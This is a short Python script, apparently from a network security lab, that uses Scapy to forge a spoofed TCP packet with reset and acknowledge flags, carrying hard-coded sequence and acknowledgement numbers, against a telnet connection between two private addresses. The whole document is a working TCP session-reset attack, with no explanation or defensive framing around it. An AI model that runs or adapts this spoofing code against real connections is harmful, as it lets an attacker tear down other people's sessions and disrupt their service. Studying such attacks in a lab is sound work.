#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=46032,dport=23,flags="RA",seq=2024507026, ack=1191475200)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)